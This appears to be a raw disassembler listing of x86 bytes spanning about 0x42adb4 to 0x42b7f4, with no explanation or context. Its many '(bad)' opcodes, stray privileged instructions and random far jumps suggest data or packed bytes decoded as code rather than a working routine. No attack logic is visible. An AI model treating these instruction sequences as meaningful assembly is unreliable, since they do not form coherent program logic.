  42adb4:	loopne 0x42adb6
	...
  42ae16:	mov    edi,0x4a8e4af7
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [esi+eax*4-0x5f447631]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    cl,al
  42ae2f:	scas   al,BYTE PTR es:[edi]
  42ae30:	outs   dx,DWORD PTR ds:[esi]
  42ae31:	push   esi
  42ae32:	fucom  st(6)
  42ae34:	mov    ebx,0x312c805e
  42ae39:	leave  
  42ae3a:	(bad)  
  42ae3b:	pop    ss
  42ae3c:	push   ecx
  42ae3d:	fisttp QWORD PTR [ebx-0x62f86376]
  42ae43:	shl    edi,1
  42ae45:	ins    BYTE PTR es:[edi],dx
  42ae46:	je     0x42ae7d
  42ae48:	(bad)  
  42ae49:	pop    esp
  42ae4a:	sub    esi,DWORD PTR [ecx+0xb612f27]
  42ae50:	pop    ecx
  42ae51:	lods   al,BYTE PTR ds:[esi]
  42ae52:	imul   esp,DWORD PTR [edx],0xfffffff2
  42ae55:	mov    bl,0xe0
  42ae57:	gs pop ebx
  42ae59:	pop    ebp
  42ae5a:	xchg   esp,eax
  42ae5b:	mov    WORD PTR [ecx-0x53bb47c8],ds
  42ae61:	(bad)  
  42ae62:	fbstp  TBYTE PTR [esi]
  42ae64:	sbb    eax,0xdac1658e
  42ae69:	push   ebp
  42ae6a:	add    al,0x2b
  42ae6c:	(bad)  
  42ae6e:	ret    0x13d0
  42ae71:	fwait
  42ae72:	aad    0x69
  42ae74:	mov    dh,bl
  42ae76:	xchg   esi,eax
  42ae77:	mov    ah,0x7f
  42ae79:	stos   BYTE PTR es:[edi],al
  42ae7a:	xor    ch,BYTE PTR ds:0x3c893d20
  42ae80:	nop
  42ae81:	add    DWORD PTR [esi-0x44],esi
  42ae84:	pop    ss
  42ae85:	sub    DWORD PTR [esi],0xffffffbf
  42ae88:	dec    ecx
  42ae89:	or     DWORD PTR [edi+0x46b32b6c],ebp
  42ae8f:	mov    dl,0x32
  42ae91:	cwde   
  42ae92:	and    esp,ecx
  42ae94:	mov    ah,BYTE PTR [ebp-0x2bebdd07]
  42ae9a:	push   ax
  42ae9c:	je     0x42ae69
  42ae9e:	inc    ecx
  42ae9f:	mov    edx,0x8039f3e1
  42aea4:	cld    
  42aea5:	mov    bh,bl
  42aea7:	data16 rcr bh,0xf2
  42aeab:	outs   dx,BYTE PTR ds:[esi]
  42aeac:	enter  0x7e08,0xfa
  42aeb0:	int    0x15
  42aeb2:	repnz (bad) 
  42aeb4:	push   ebx
  42aeb5:	xchg   esi,eax
  42aeb6:	pop    esi
  42aeb7:	sub    eax,0xe8321568
  42aebc:	add    ah,BYTE PTR [ebx+0x26e68b7f]
  42aec2:	rcl    DWORD PTR [edx],1
  42aec4:	pop    esi
  42aec5:	mov    DWORD PTR ds:0xab831813,edi
  42aecb:	jmp    0x42af1d
  42aecd:	enter  0xbf70,0xe7
  42aed1:	add    ax,0xc7ae
  42aed5:	cs jmp 0x42af19
  42aed8:	pushf  
  42aed9:	(bad)  
  42aeda:	pop    ds
  42aedb:	pop    ecx
  42aedc:	push   ebp
  42aedd:	inc    edi
  42aede:	adc    eax,0x5b41aaed
  42aee3:	lahf   
  42aee4:	mov    ah,0xb6
  42aee6:	push   eax
  42aee7:	add    eax,0x918d9e62
  42aeec:	data16 adc BYTE PTR [ecx+0x51addc0f],0x16
  42aef4:	push   ds
  42aef5:	inc    edi
  42aef6:	pop    esp
  42aef7:	add    DWORD PTR ds:0xa3018dfa,edi
  42aefd:	inc    ebx
  42aefe:	fistp  QWORD PTR ds:0x11758e6a
  42af04:	sbb    BYTE PTR [edi+0x99074b8],bh
  42af0a:	pop    ds
  42af0b:	lods   eax,DWORD PTR ds:[esi]
  42af0c:	int    0x5b
  42af0e:	jmp    DWORD PTR [ecx-0x80]
  42af11:	sbb    al,bl
  42af13:	jne    0x42aef9
  42af15:	aas    
  42af16:	adc    eax,0xf29c10bf
  42af1b:	(bad)  
  42af1c:	fcomp  DWORD PTR [edi]
  42af1e:	retf   
  42af1f:	sub    BYTE PTR [edi],bl
  42af21:	cmp    DWORD PTR [ebp*4-0x2359dc4],edx
  42af28:	xor    bh,BYTE PTR [edi+0x26adefba]
  42af2e:	cmc    
  42af2f:	mov    esp,0x7925d3fa
  42af34:	or     eax,0x0
	...
  42af95:	add    cl,bh
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp-0x799f7216],0x41
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    BYTE PTR [eax+0x29e708a6],bh
  42afb3:	sbb    BYTE PTR [ebp+0x39885a78],dh
  42afb9:	dec    ebp
  42afba:	pop    ebp
  42afbb:	sub    dh,al
  42afbd:	jnp    0x42afd1
  42afbf:	mov    DWORD PTR [ebp+0xa9a8f04],esi
  42afc5:	dec    edi
  42afc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afc7:	pop    eax
  42afc8:	dec    ecx
  42afc9:	jbe    0x42afdc
  42afcb:	push   es
  42afcc:	loop   0x42af92
  42afce:	sbb    ebx,edi
  42afd0:	push   edi
  42afd1:	or     ch,BYTE PTR [ebp+0x21bc0e54]
  42afd7:	xor    BYTE PTR [eax],al
  42afd9:	mov    edi,0x7412cdc0
  42afde:	adc    ebp,esp
  42afe0:	pop    esi
  42afe1:	lock mov esi,esp
  42afe4:	or     al,0x82
  42afe6:	mov    edi,0xb59a0f0a
  42afeb:	xchg   ebx,eax
  42afec:	idiv   DWORD PTR [edi]
  42afee:	(bad)  
  42afef:	push   eax
  42aff0:	xor    bh,0x7f
  42aff3:	lds    edi,FWORD PTR [edi+edx*2-0x1d]
  42aff7:	or     edi,DWORD PTR [eax]
  42aff9:	jecxz  0x42b056
  42affb:	push   ss
  42affc:	xor    ecx,0xa06859a6
  42b002:	and    BYTE PTR [edx],cl
  42b004:	out    dx,eax
  42b005:	les    ecx,FWORD PTR [eax-0x4fc9af96]
  42b00b:	jmp    0x42afe2
  42b00d:	add    ecx,DWORD PTR [edx]
  42b00f:	or     bl,al
  42b011:	icebp  
  42b012:	push   DWORD PTR [esi+0x44]
  42b015:	(bad)  
  42b017:	add    eax,0x515fe73b
  42b01c:	jecxz  0x42b043
  42b01e:	clc    
  42b01f:	add    BYTE PTR [esi+ebx*4],dh
  42b022:	sbb    esi,DWORD PTR [ebp+0x56]
  42b025:	fisttp DWORD PTR [eax]
  42b027:	xchg   ecx,eax
  42b028:	and    ebp,ebp
  42b02a:	add    ch,BYTE PTR [ecx-0x69]
  42b02d:	xchg   ebp,eax
  42b02e:	pop    eax
  42b02f:	mov    esp,0x260e1709
  42b034:	sbb    ah,cl
  42b036:	jp     0x42b01e
  42b038:	pop    esp
  42b039:	adc    al,0x24
  42b03b:	add    DWORD PTR [ecx+0x72a19ce8],esp
  42b041:	daa    
  42b042:	xchg   ebx,eax
  42b043:	retf   0xf1e8
  42b046:	add    DWORD PTR [edi-0x16],ebx
  42b049:	mov    eax,ds:0x166c5f11
  42b04e:	das    
  42b04f:	xchg   BYTE PTR [edi+0x3c],ah
  42b052:	(bad)  
  42b054:	xchg   edx,eax
  42b055:	scas   eax,DWORD PTR es:[edi]
  42b056:	cmp    al,0x2e
  42b058:	arpl   WORD PTR [esi+esi*2-0x1f],cx
  42b05c:	frstor [edx-0x48986120]
  42b062:	iret   
  42b063:	or     ah,ah
  42b065:	das    
  42b066:	rcl    esi,cl
  42b068:	xchg   ebx,eax
  42b069:	and    ebp,DWORD PTR [esi+0x3d865099]
  42b06f:	dec    esp
  42b070:	push   0x38
  42b072:	shl    DWORD PTR [esi+eiz*1-0x5a],0xca
  42b077:	pop    es
  42b078:	clc    
  42b079:	adc    al,0xe2
  42b07b:	push   edi
  42b07c:	xchg   ebp,eax
  42b07d:	arpl   WORD PTR cs:[ebp+0x34b0d934],bx
  42b084:	mov    ds:0x1e77bd9,eax
  42b089:	pop    edx
  42b08a:	scas   al,BYTE PTR es:[edi]
  42b08b:	adc    al,0x4a
  42b08e:	sbb    al,0x26
  42b090:	test   DWORD PTR [ecx+ecx*4+0xb0ccaf1],esi
  42b097:	add    BYTE PTR [esp+eax*1+0x45f78abe],ch
  42b09e:	xchg   DWORD PTR [edx+ecx*1],ebx
  42b0a1:	hlt    
  42b0a2:	clc    
  42b0a3:	aam    0x5b
  42b0a5:	int    0x7b
  42b0a7:	jge    0x42b0a0
  42b0a9:	shl    BYTE PTR [eax+0x46b7e2b7],cl
  42b0af:	and    edx,DWORD PTR [ebx]
  42b0b1:	sbb    al,0x18
  42b0b3:	rcl    DWORD PTR [ebp+0x0],cl
	...
  42b115:	add    BYTE PTR [ebp+0x25],dh
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi-0x255c7f53]
  42b124:	adc    al,0xb6
  42b126:	scas   al,BYTE PTR es:[edi]
  42b127:	int3   
  42b128:	add    DWORD PTR [eax],eax
  42b12a:	pop    es
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    BYTE PTR [esi+edx*8+0x2194e151],dh
  42b134:	adc    eax,0xb5dada1
  42b139:	shl    ah,cl
  42b13b:	and    BYTE PTR [eax+ebx*2],cl
  42b13e:	pushf  
  42b13f:	arpl   si,bp
  42b141:	sbb    DWORD PTR [ecx],edi
  42b143:	imul   edx,DWORD PTR [ebp+0x29],0xa302941a
  42b14a:	repz adc BYTE PTR [esi+0x445aa00f],cl
  42b151:	xor    edx,DWORD PTR [eax+0x531474c2]
  42b157:	adc    eax,0xcd89105f
  42b15c:	mov    al,ds:0x6ee341a0
  42b161:	adc    BYTE PTR [ebx+0x65232bdb],0x1
  42b168:	pop    esp
  42b169:	xor    DWORD PTR [esi],esi
  42b16b:	jecxz  0x42b185
  42b16d:	retf   
  42b16e:	adc    eax,0x4da45ad6
  42b173:	mov    dh,0xd7
  42b175:	mov    BYTE PTR ss:[esi+0x7],bh
  42b179:	pop    ebx
  42b17a:	gs rcl ch,0x66
  42b17e:	push   ebp
  42b17f:	sbb    esi,DWORD PTR [edx-0x3b]
  42b182:	stc    
  42b183:	sbb    ecx,edx
  42b185:	mov    esp,0x5e015ccb
  42b18a:	or     bh,BYTE PTR [esi+0x71ee4668]
  42b190:	or     BYTE PTR [esi],ah
  42b192:	adc    ebp,DWORD PTR [edx]
  42b194:	test   al,0xb8
  42b196:	lods   al,BYTE PTR ds:[esi]
  42b197:	aad    0x7d
  42b199:	pop    esp
  42b19a:	xchg   BYTE PTR [eax],dl
  42b19c:	shl    DWORD PTR [edx-0x3146baa6],1
  42b1a2:	(bad)  
  42b1a3:	pop    ss
  42b1a4:	cdq    
  42b1a5:	dec    esi
  42b1a6:	mov    BYTE PTR [edi+ebp*1],bl
  42b1a9:	nop
  42b1aa:	push   ebp
  42b1ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b1ac:	fisttp QWORD PTR [ebx+0x31]
  42b1af:	sub    al,0x86
  42b1b1:	xchg   ecx,eax
  42b1b2:	sar    ebx,1
  42b1b4:	xor    dh,BYTE PTR [ecx]
  42b1b6:	mov    ds,esi
  42b1b8:	dec    edx
  42b1b9:	sbb    DWORD PTR [edx+0x1ded0869],ebx
  42b1bf:	xor    DWORD PTR [esi-0x5fd15c60],eax
  42b1c5:	mov    bl,0x3a
  42b1c7:	pop    edi
  42b1c8:	mov    ebx,ebx
  42b1ca:	push   esp
  42b1cb:	fst    QWORD PTR [eax]
  42b1cd:	mov    eax,ds:0x520b6eb
  42b1d2:	pop    esp
  42b1d3:	fcmovne st,st(1)
  42b1d5:	enter  0xd7bd,0xaf
  42b1d9:	imul   ecx,DWORD PTR [esi-0x23],0x9a7641ad
  42b1e0:	leave  
  42b1e1:	cli    
  42b1e2:	jmp    0x42b18c
  42b1e4:	push   edi
  42b1e5:	dec    edx
  42b1e6:	mov    ecx,0x999b7c2d
  42b1eb:	popa   
  42b1ec:	mov    ecx,0x5d80da86
  42b1f1:	jne    0x42b20a
  42b1f3:	cs inc ebp
  42b1f5:	in     eax,0x63
  42b1f7:	mov    al,0x1
  42b1f9:	fstp   DWORD PTR [ebp-0x31d859fc]
  42b1ff:	imul   edi,DWORD PTR [ecx+ebx*4],0x2e
  42b203:	xor    ebx,DWORD PTR [edx+0x2810f73d]
  42b209:	pop    ss
  42b20a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b20b:	push   ds
  42b20c:	add    esi,edi
  42b20e:	dec    esi
  42b20f:	adc    dl,BYTE PTR [ecx]
  42b211:	sub    ebx,edi
  42b213:	jnp    0x42b254
  42b215:	xchg   edx,eax
  42b216:	jo     0x42b287
  42b218:	ret    0x63b
  42b21b:	jecxz  0x42b21f
  42b21d:	fild   WORD PTR [eax-0x7a7071e5]
  42b223:	repz shl edx,1
  42b226:	std    
  42b227:	shl    DWORD PTR [ebx+0x1c],0xfb
  42b22b:	test   BYTE PTR [esi-0x13],0x0
  42b22f:	mov    bh,0x53
  42b231:	es push es
  42b233:	fdivr  DWORD PTR [ebx]
	...
  42b295:	add    BYTE PTR [ebp-0x449f6672],ah
  42b29b:	ja     0x42b29a
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp+0x1a],ch
  42b2a3:	out    0x15,al
  42b2a5:	jmp    0x107:0x1cdb5
  42b2ac:	add    BYTE PTR [eax],al
  42b2ae:	scas   eax,DWORD PTR es:[edi]
  42b2af:	imul   ebp,esi,0xc454eb53
  42b2b5:	adc    eax,0x6f73cb04
  42b2ba:	loopne 0x42b2c7
  42b2bc:	(bad)  
  42b2bd:	cdq    
  42b2be:	hlt    
  42b2bf:	dec    esi
  42b2c0:	or     BYTE PTR [edi+esi*4],0x60
  42b2c4:	lds    ebx,FWORD PTR [esi]
  42b2c6:	inc    eax
  42b2c7:	call   0xa9b27edf
  42b2cc:	jmp    0x9bb0:0xcca81b4e
  42b2d3:	in     al,0xb3
  42b2d5:	pop    esp
  42b2d6:	lods   al,BYTE PTR ds:[esi]
  42b2d7:	xchg   ecx,eax
  42b2d8:	mov    bh,0x12
  42b2da:	xchg   esp,eax
  42b2db:	jp     0x42b2eb
  42b2dd:	test   DWORD PTR [ebx+edi*2],edx
  42b2e0:	cs jge 0xcb96de8f
  42b2e7:	mov    eax,ds:0x54669840
  42b2ec:	cmp    eax,0xc5f11e95
  42b2f1:	int3   
  42b2f2:	xchg   ebx,eax
  42b2f3:	test   al,0xcd
  42b2f5:	fistp  WORD PTR [edx+eax*2+0x25a433e5]
  42b2fc:	ds mov bl,0xce
  42b2ff:	jg     0x42b37d
  42b301:	push   edx
  42b302:	push   esp
  42b303:	dec    edi
  42b304:	adc    bh,BYTE PTR [eax-0x8c9c6ac]
  42b30a:	dec    esi
  42b30b:	push   esi
  42b30c:	out    0x46,eax
  42b30e:	cmc    
  42b30f:	mov    ah,0x2a
  42b311:	arpl   di,cx
  42b313:	and    ch,BYTE PTR [ebx]
  42b315:	dec    edx
  42b316:	mov    ah,BYTE PTR [edi-0x4b8c5f0f]
  42b31c:	mov    edi,0x9aabcbd4
  42b321:	clc    
  42b322:	xor    ebp,ebx
  42b324:	hlt    
  42b325:	jbe    0x42b301
  42b327:	sub    al,0xd3
  42b329:	clc    
  42b32a:	jl     0x42b38e
  42b32c:	aas    
  42b32d:	repnz mov al,ds:0x4eb843bf
  42b333:	pop    ss
  42b334:	mov    esp,0xef320de0
  42b339:	adc    al,BYTE PTR [ebx+0x33]
  42b33c:	rcl    DWORD PTR [edx],1
  42b33e:	gs ins DWORD PTR es:[edi],dx
  42b340:	hlt    
  42b341:	add    edi,0x6a
  42b344:	cmp    bh,BYTE PTR [esi+0x52]
  42b347:	mov    ds:0x7171ead7,al
  42b34c:	mov    dl,0x2c
  42b34e:	fs std 
  42b350:	pop    ds
  42b351:	test   al,0x67
  42b353:	sbb    bh,0xe5
  42b356:	nop
  42b357:	push   cs
  42b358:	ins    DWORD PTR es:[edi],dx
  42b359:	shl    DWORD PTR [ebx],0x20
  42b35c:	pop    ss
  42b35d:	mov    ebx,DWORD PTR [ebx-0x13]
  42b360:	xor    eax,DWORD PTR [ebx+0x30a226c1]
  42b366:	cmp    al,0x1
  42b368:	push   ecx
  42b369:	gs jg  0x42b352
  42b36c:	(bad)  
  42b36d:	and    BYTE PTR [ecx+0x42],cl
  42b370:	and    DWORD PTR [esi+0x77],0x67
  42b374:	and    ch,dl
  42b376:	(bad)  
  42b377:	jge    0x42b39f
  42b379:	push   ebx
  42b37a:	dec    eax
  42b37b:	mov    al,ds:0x4d8f1ceb
  42b380:	sbb    DWORD PTR [eax+0x50],edx
  42b383:	inc    eax
  42b384:	xchg   esi,eax
  42b385:	push   eax
  42b386:	cmp    DWORD PTR [ecx+0x76f2c698],ebx
  42b38c:	inc    ebx
  42b38d:	gs (bad) 
  42b390:	js     0x42b341
  42b392:	adc    al,0xeb
  42b394:	sub    BYTE PTR [edx-0x57ae7382],ch
  42b39a:	pop    ss
  42b39b:	dec    edi
  42b39c:	cmp    edx,ebp
  42b39e:	mov    eax,ds:0x33a8233f
  42b3a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3a4:	jno    0x42b375
  42b3a6:	(bad)
  42b3a9:	dec    esp
  42b3aa:	mov    eax,0x688411f7
  42b3af:	mov    ebx,0xe42765e9
  42b3b4:	xchg   ebx,eax
	...
  42b415:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0x41
  42b423:	aas    
  42b424:	cmp    dh,al
  42b426:	mov    esp,0x70001ce
  42b42b:	add    DWORD PTR [eax],eax
  42b42d:	add    BYTE PTR [ebx-0x370a23ca],bh
  42b433:	clc    
  42b434:	dec    esp
  42b435:	dec    ecx
  42b436:	adc    BYTE PTR [eax-0x6db5007f],cl
  42b43c:	ror    BYTE PTR [edi],0x82
  42b43f:	mov    ds:0xf7eb4c37,al
  42b444:	push   edx
  42b445:	pop    eax
  42b446:	cmp    BYTE PTR [edi-0x17940903],ah
  42b44c:	pop    edi
  42b44d:	subps  xmm5,xmm0
  42b450:	(bad)  
  42b451:	(bad)  
  42b452:	mov    al,0x77
  42b454:	je     0x42b433
  42b456:	adc    eax,0x2207f8f6
  42b45b:	aas    
  42b45c:	mov    edx,0x8dc09d11
  42b461:	inc    esi
  42b462:	retf   0x848e
  42b465:	mul    BYTE PTR [ebx+0x23]
  42b468:	xor    eax,0x7b479358
  42b46d:	sahf   
  42b46e:	dec    edx
  42b46f:	mov    dh,BYTE PTR [ebx]
  42b471:	rcl    esp,cl
  42b473:	and    bh,BYTE PTR [edx+0x6eb5432d]
  42b479:	stos   DWORD PTR es:[edi],eax
  42b47a:	(bad)  
  42b47b:	out    dx,al
  42b47c:	dec    ecx
  42b47d:	mov    cl,0x92
  42b47f:	cmp    al,0x5c
  42b481:	xchg   di,ax
  42b483:	pop    esp
  42b484:	fcom   DWORD PTR [esi+0x4c3d599b]
  42b48a:	cmp    bh,al
  42b48c:	mov    al,ds:0x87dbd384
  42b491:	inc    esi
  42b492:	xchg   ecx,eax
  42b493:	sbb    BYTE PTR [ebp+edx*1+0x5bed6404],bh
  42b49a:	jecxz  0x42b4e7
  42b49c:	(bad)  [edi]
  42b49e:	shr    BYTE PTR [esi],0xba
  42b4a1:	adc    esp,edx
  42b4a3:	cld    
  42b4a4:	jmp    0x13c29f59
  42b4a9:	cmp    dl,BYTE PTR [edi]
  42b4ab:	xchg   ebx,eax
  42b4ac:	ret    
  42b4ad:	or     ebp,DWORD PTR [ebx-0x28]
  42b4b0:	lds    eax,FWORD PTR [esi+eiz*8-0x2d]
  42b4b4:	out    0x22,eax
  42b4b6:	or     al,0x39
  42b4b8:	repnz pop esp
  42b4ba:	cli    
  42b4bb:	js     0x42b483
  42b4bd:	fadd   QWORD PTR [edx]
  42b4bf:	inc    edi
  42b4c0:	ror    cl,0x84
  42b4c3:	xor    bl,BYTE PTR [esi-0x2b9cc0e7]
  42b4c9:	dec    edx
  42b4ca:	push   esp
  42b4cb:	xor    al,0xf1
  42b4cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b4ce:	pop    ecx
  42b4cf:	xor    DWORD PTR [ecx-0x67],0x23fe869b
  42b4d6:	dec    esi
  42b4d7:	cmp    BYTE PTR [edi],0x65
  42b4da:	xchg   esi,eax
  42b4db:	xchg   ebx,eax
  42b4dc:	push   eax
  42b4dd:	ficomp DWORD PTR [edx-0x1ad2699e]
  42b4e3:	sar    DWORD PTR [ecx+0x3e8b3437],0xf9
  42b4ea:	cdq    
  42b4eb:	shl    DWORD PTR [ebp-0x1e],cl
  42b4ee:	pop    eax
  42b4ef:	pop    ecx
  42b4f0:	shr    ecx,0x12
  42b4f3:	pop    ecx
  42b4f4:	popa   
  42b4f5:	retf   0xbb14
  42b4f8:	pop    ecx
  42b4f9:	test   al,0x34
  42b4fb:	je     0x42b4b6
  42b4fd:	mov    ch,0xe8
  42b4ff:	ret    
  42b500:	retf   
  42b501:	mov    ds:0x3edcde4c,al
  42b506:	shl    BYTE PTR [esi],0xe2
  42b509:	into   
  42b50a:	sub    eax,0x76ecb457
  42b50f:	push   ecx
  42b510:	(bad)  
  42b511:	call   0xc18923bb
  42b516:	cmp    DWORD PTR [ebx+ebp*8+0x2be45b7a],ecx
  42b51d:	bswap  ebp
  42b51f:	lock push 0x417c7611
  42b525:	adc    eax,0x78df2ed2
  42b52a:	ret    0xead8
  42b52d:	push   esp
  42b52e:	xor    DWORD PTR [ebx],0x63
  42b531:	in     al,0x1a
  42b533:	xor    eax,0x49
	...
  42b594:	add    BYTE PTR [eax],al
  42b596:	loopne 0x42b52c
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	inc    ebp
  42b5a3:	pop    eax
  42b5a5:	sbb    eax,ebx
  42b5a7:	iret   
  42b5a8:	add    DWORD PTR [eax],eax
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    al,dh
  42b5af:	fsub   DWORD PTR [eax+0x12]
  42b5b2:	and    eax,0x16a29f67
  42b5b7:	in     eax,dx
  42b5b8:	cmp    DWORD PTR [ebp+0x70],0x3e
  42b5bc:	cmp    BYTE PTR [esi-0x58],al
  42b5bf:	mov    ecx,0x66873cf5
  42b5c4:	dec    esp
  42b5c5:	sbb    al,0x19
  42b5c7:	dec    esi
  42b5c8:	and    ebp,0xffffffde
  42b5cb:	add    edi,edi
  42b5cd:	inc    eax
  42b5ce:	cld    
  42b5cf:	add    al,0xe0
  42b5d1:	jg     0x42b616
  42b5d3:	adc    eax,0x5995d4fa
  42b5d8:	cmp    BYTE PTR ds:0x494071e4,cl
  42b5de:	or     ebx,ebx
  42b5e0:	mov    ds:0xeb6b3207,al
  42b5e5:	add    BYTE PTR [ecx+0x6e031f3f],ch
  42b5eb:	adc    eax,DWORD PTR [ebp+0x736dc694]
  42b5f1:	mov    al,0x96
  42b5f3:	(bad)  
  42b5f4:	lahf   
  42b5f5:	jae    0x42b5b5
  42b5f7:	add    dl,BYTE PTR [esi+0x69]
  42b5fa:	push   eax
  42b5fb:	push   cs
  42b5fc:	out    0xf2,al
  42b5fe:	daa    
  42b5ff:	sub    dl,BYTE PTR [eax-0x5cc0449c]
  42b605:	or     BYTE PTR [eax],cl
  42b607:	inc    ebx
  42b608:	jne    0x42b604
  42b60a:	xor    al,0xcc
  42b60c:	push   ebp
  42b60d:	jnp    0x42b5e0
  42b60f:	fistp  DWORD PTR [esi]
  42b611:	or     BYTE PTR [ebp-0x5dc1938b],cl
  42b617:	shl    BYTE PTR [edx-0x502871bf],0x3e
  42b61e:	adc    al,0x16
  42b620:	jmp    0x42b62f
  42b622:	rol    DWORD PTR [ebx+0x6f],0xec
  42b626:	mov    ebx,0x2d31bba7
  42b62b:	sbb    bl,0x7c
  42b62e:	aad    0x2c
  42b630:	add    dl,bl
  42b632:	jne    0x42b668
  42b634:	js     0x42b603
  42b636:	fisub  DWORD PTR [ebx+0x5eb982c8]
  42b63c:	stos   BYTE PTR es:[edi],al
  42b63d:	sbb    cl,0x6
  42b640:	call   0xc491a90
  42b645:	and    edx,DWORD PTR [edi]
  42b647:	ss fs and al,0xfb
  42b64b:	mov    al,ds:0x39a581b
  42b650:	pop    esi
  42b651:	loop   0x42b65d
  42b653:	aad    0x4d
  42b655:	nop
  42b656:	sub    al,0xec
  42b658:	retf   
  42b659:	dec    eax
  42b65a:	add    BYTE PTR [eax],bh
  42b65c:	pop    ebx
  42b65d:	lea    ecx,[edi+0xe]
  42b660:	aaa    
  42b661:	and    BYTE PTR [eax+0x4],dh
  42b664:	add    edx,0x48c679f
  42b66a:	data16 add bh,BYTE PTR [edx+0x23e8f070]
  42b671:	xchg   eax,esp
  42b673:	xor    eax,0x6d77ead2
  42b678:	iret   
  42b679:	jecxz  0x42b694
  42b67b:	test   eax,0x993f5402
  42b680:	in     eax,0x6e
  42b682:	cmp    BYTE PTR [ecx+0x57a6e083],cl
  42b688:	in     al,dx
  42b689:	ins    BYTE PTR es:[edi],dx
  42b68a:	push   es
  42b68b:	sbb    eax,DWORD PTR [edi+0x6c]
  42b68e:	iret   
  42b68f:	fild   DWORD PTR [edx+0x70]
  42b692:	or     eax,0x82a40c6b
  42b697:	dec    esp
  42b698:	and    edi,DWORD PTR [ecx+0x77]
  42b69b:	inc    edi
  42b69c:	addr16 je 0x42b710
  42b69f:	inc    ecx
  42b6a0:	dec    ebp
  42b6a1:	add    BYTE PTR [ebx+edi*1],bh
  42b6a4:	jmp    0x11501b3d
  42b6a9:	pushf  
  42b6aa:	enter  0x438b,0x77
  42b6ae:	aam    0x37
  42b6b0:	rol    BYTE PTR [esi],1
  42b6b2:	ret    0x6198
	...
  42b715:	add    BYTE PTR [esi+0x42],cl
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp+0x1a],bl
  42b723:	fnstenv [eax+0x1d0ca9e]
  42b729:	add    BYTE PTR [edi],al
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    BYTE PTR [ebp+0x4e],dl
  42b730:	jmp    0xf6ec5bf1
  42b735:	inc    edi
  42b736:	mov    ebx,0x29bdd054
  42b73b:	mov    ch,0x47
  42b73d:	add    al,0x43
  42b73f:	vmread DWORD PTR [ebx],ebx
  42b742:	ficomp WORD PTR [ecx-0x24377f98]
  42b748:	lahf   
  42b749:	and    DWORD PTR [edx-0x1b],edi
  42b74c:	or     edi,DWORD PTR [ecx-0x11c85ba0]
  42b752:	mov    bh,BYTE PTR [edx]
  42b754:	dec    edi
  42b755:	mov    dh,0xfa
  42b757:	fld    QWORD PTR [esi+0x6a18988b]
  42b75d:	fwait
  42b75e:	not    DWORD PTR [edx+ebx*4]
  42b761:	not    BYTE PTR [ebx-0x43]
  42b764:	in     eax,dx
  42b765:	sahf   
  42b766:	lea    esp,ds:0xdb337ce4
  42b76c:	call   0xd545:0xfa04d61a
  42b773:	fidiv  DWORD PTR ds:0x2b76bb39
  42b779:	enter  0xc209,0xfd
  42b77d:	in     al,dx
  42b77e:	adc    ah,dh
  42b780:	into   
  42b781:	cwde   
  42b782:	sbb    DWORD PTR [ecx+0x6a29e717],edx
  42b788:	int3   
  42b789:	gs dec eax
  42b78b:	jmp    0xdd3f:0xfa725ad4
  42b792:	into   
  42b793:	xchg   BYTE PTR [edx],ah
  42b795:	add    al,0x68
  42b797:	daa    
  42b798:	test   al,0x49
  42b79a:	data16 mov ch,0x90
  42b79d:	cmp    ch,cl
  42b79f:	cdq    
  42b7a0:	ficom  WORD PTR [ecx+eiz*8+0x7d1a2a30]
  42b7a7:	test   DWORD PTR [ecx-0x32],0xa1ce1cdd
  42b7ae:	repz out 0x8a,eax
  42b7b1:	arpl   WORD PTR [ebx],sp
  42b7b3:	call   0x71b81495
  42b7b8:	xchg   ebx,eax
  42b7b9:	les    edi,FWORD PTR [edx]
  42b7bb:	in     al,0xb5
  42b7bd:	mov    eax,0x1297df5c
  42b7c2:	rol    DWORD PTR [edi],cl
  42b7c4:	lds    eax,FWORD PTR [esi+eiz*2-0x619f1e57]
  42b7cb:	nop
  42b7cc:	pop    ds
  42b7cd:	sbb    ebx,DWORD PTR [ebx+0x37]
  42b7d0:	imul   ebp,DWORD PTR [ecx],0x73
  42b7d3:	xlat   BYTE PTR ds:[ebx]
  42b7d4:	(bad)  
  42b7d5:	nop
  42b7d6:	iret   
  42b7d7:	xor    ebp,eax
  42b7d9:	sub    DWORD PTR [ebx-0x6b],eax
  42b7dc:	pop    es
  42b7dd:	fisttp QWORD PTR [edi+edx*1-0x63]
  42b7e1:	push   ds
  42b7e2:	jle    0x42b7ef
  42b7e4:	jns    0x42b773
  42b7e6:	dec    eax
  42b7e7:	jge    0x42b828
  42b7e9:	push   ss
  42b7ea:	inc    ecx
  42b7eb:	test   BYTE PTR [edi+0x7b],dl
  42b7ee:	inc    BYTE PTR [ebp+0x1cc9b15c]
  42b7f4:	mov    edi,ebp
